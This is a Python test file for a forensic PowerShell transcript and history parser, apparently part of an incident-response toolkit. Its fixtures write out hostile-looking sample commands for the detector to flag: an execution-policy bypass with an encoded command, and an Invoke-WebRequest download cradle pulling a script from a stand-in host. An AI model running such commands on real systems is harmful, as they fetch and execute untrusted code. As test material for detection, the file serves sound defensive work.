import json
from pathlib import Path

def test_powershell_parser_ignores_generic_logs(monkeypatch, tmp_path):
    from sift_sentinel.tools.parse_powershell_transcripts import parse_powershell_transcripts

    log_dir = tmp_path / "ProgramData" / "Vendor" / "Logs"
    log_dir.mkdir(parents=True)
    (log_dir / "agent.log").write_text("2026-01-01 INFO not a powershell command\n", encoding="utf-8")

    monkeypatch.setenv("SIFT_ACTIVE_DISK_MOUNT", str(tmp_path))
    result = parse_powershell_transcripts()
    assert result["record_count"] == 0
    assert result["status"] == "not_applicable"
    assert "/mnt/windows_mount" not in json.dumps(result, default=str)

def test_powershell_parser_reads_console_history(monkeypatch, tmp_path):
    from sift_sentinel.tools.parse_powershell_transcripts import parse_powershell_transcripts

    hist = tmp_path / "Users" / "analyst" / "AppData" / "Roaming" / "Microsoft" / "Windows" / "PowerShell" / "PSReadLine" / "ConsoleHost_history.txt"
    hist.parent.mkdir(parents=True)
    hist.write_text("Get-Process\npowershell -ExecutionPolicy Bypass -EncodedCommand SQBFAFgA\n", encoding="utf-8")

    monkeypatch.setenv("SIFT_ACTIVE_DISK_MOUNT", str(tmp_path))
    result = parse_powershell_transcripts()
    text = json.dumps(result, default=str)
    assert result["record_count"] == 2
    assert result["status"] == "transcripts_parsed"
    assert str(hist) in text
    assert "/mnt/windows_mount" not in text
    assert any("encoded_command" in r.get("suspicious_markers", []) for r in result["records"])

def test_powershell_parser_reads_prompted_transcript(monkeypatch, tmp_path):
    from sift_sentinel.tools.parse_powershell_transcripts import parse_powershell_transcripts

    tr = tmp_path / "Users" / "analyst" / "Documents" / "PowerShell_transcript.TEST.txt"
    tr.parent.mkdir(parents=True)
    tr.write_text(
        "**********************\n"
        "Windows PowerShell transcript start\n"
        "PS C:\\Users\\analyst> Invoke-WebRequest http://example.test/a.ps1\n",
        encoding="utf-8",
    )

    monkeypatch.setenv("SIFT_ACTIVE_DISK_MOUNT", str(tmp_path))
    result = parse_powershell_transcripts()
    assert result["record_count"] == 1
    rec = result["records"][0]
    assert rec["source_kind"] == "transcript"
    assert "download_cradle" in rec["suspicious_markers"]
